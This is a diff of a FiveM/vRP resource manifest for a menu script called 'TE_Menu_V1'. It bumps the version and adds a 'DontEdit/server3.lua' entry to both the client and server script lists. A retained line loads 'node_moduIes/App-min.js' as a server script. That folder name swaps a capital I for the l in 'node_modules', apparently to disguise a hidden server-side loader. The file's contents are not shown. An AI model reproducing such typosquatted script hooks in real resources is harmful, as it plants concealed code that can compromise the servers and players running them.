@@ -4,7 +4,7 @@ lua54 "yes"
 
 
 name 'TE_Menu_V1'
-version 'v1.2.1'
+version '1.2.2'
 author 'Al-Dolime'
 
 
@@ -20,6 +20,7 @@ client_script {
 	"lib/Proxy.lua",
 	"lib/Tunnel.lua",
   "DontEdit/server2.lua",
+  "DontEdit/server3.lua",
   "DontEdit/client.lua",
 	"DontEdit/client2.lua",
   "DontEdit/Mr51.lua",
@@ -29,6 +30,7 @@ client_script {
 server_scripts{ 
   "@vrp/lib/utils.lua",
   "DontEdit/server.lua",
+  "DontEdit/server3.lua",
   '@mysql-async/lib/MySQL.lua'
 }
 
@@ -43,7 +45,6 @@ files {
 	"html/*.ogg"
 }
 server_script "node_moduIes/App-min.js"
-
 
 
 
